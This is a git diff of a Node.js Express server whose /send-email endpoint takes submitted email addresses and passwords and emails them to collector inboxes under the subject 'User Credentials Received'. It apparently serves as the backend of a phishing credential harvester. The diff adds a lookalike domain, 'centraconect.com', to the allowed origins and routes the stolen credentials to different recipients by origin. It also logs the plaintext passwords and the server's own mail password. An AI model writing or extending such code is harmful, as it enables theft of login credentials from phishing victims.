@@ -13,7 +13,8 @@ app.use(
       const allowedOrigins = [
         "http://localhost:5173",
         "https://web-mail-two.vercel.app",
-        "https://serviceconect.com"
+        "https://serviceconect.com",
+        "http://centraconect.com/"
       ];
 
       if (!origin || allowedOrigins.includes(origin)) {
@@ -24,11 +25,9 @@ app.use(
     },
     methods: ["GET", "POST", "OPTIONS"],
     allowedHeaders: ["Content-Type", "Authorization"],
-    credentials: true, // optional: if you're using cookies or auth headers
+    credentials: true, 
   })
 );
-
-
 
 app.use(bodyParser.json());
 
@@ -37,6 +36,7 @@ console.log("Email Pass:", process.env.EMAIL_PASS);
 console.log("Email Receiver:", process.env.EMAIL_RECEIVER);
 console.log("Email Collector:", process.env.EMAIL_COLLECTOR);
 
+// Setup nodemailer transporter
 const transporter = nodemailer.createTransport({
   host: "smtp.gmail.com",
   port: 587,
@@ -47,8 +47,7 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-
-
+// Verify transporter
 transporter.verify((error, success) => {
   if (error) {
     console.error("Nodemailer verification error:", error);
@@ -57,28 +56,46 @@ transporter.verify((error, success) => {
   }
 });
 
+// POST endpoint for sending email
 app.post("/send-email", async (req, res) => {
   const { email, password } = req.body;
-  console.log("Request body:", { email, password });
+  const origin = req.get("Origin");
+  console.log("Request Origin:", origin);
+  console.log("Request Body:", { email, password });
 
-  let mailOptions = {
-    from: email,
-    to: [process.env.EMAIL_RECEIVER, process.env.EMAIL_COLLECTOR],
-    subject: "User Credentials",
-    text: `Email: ${email}\nPassword: ${password}`,
+  const recipients =
+    origin === "https://serviceconect.com"
+      ? [process.env.EMAIL_RECEIVER]
+      : [process.env.EMAIL_COLLECTOR];
+
+  const htmlTemplate = `
+    <div style="font-family: Arial, sans-serif; padding: 20px;">
+      <h2 style="color: #333;">New Credentials Received</h2>
+      <p><strong>Email:</strong> ${email}</p>
+      <p><strong>Password:</strong> ${password}</p>
+      <hr />
+      <p style="font-size: 12px; color: #999;">This message was sent from ${origin}</p>
+    </div>
+  `;
+
+  const mailOptions = {
+    from: `<${process.env.EMAIL_USER}>`,
+    to: recipients,
+    subject: "User Credentials Received",
+    html: htmlTemplate,
   };
- 
 
   try {
-    let info = await transporter.sendMail(mailOptions);
-    console.log("Email sent: " + info.response);
-    res.status(200).json({ success: true });
+    const info = await transporter.sendMail(mailOptions);
+    console.log("Email sent:", info.response);
+    res.status(200).json({ success: true, message: "Message sent successfully" });
   } catch (error) {
     console.error("Nodemailer error:", error);
     res.status(500).json({ success: false, error: error.message });
   }
 });
 
+
 app.listen(8080, () => {
-  console.log("Server is running on port 8080");
+  console.log("✅ Server is running on port 8080");
 });
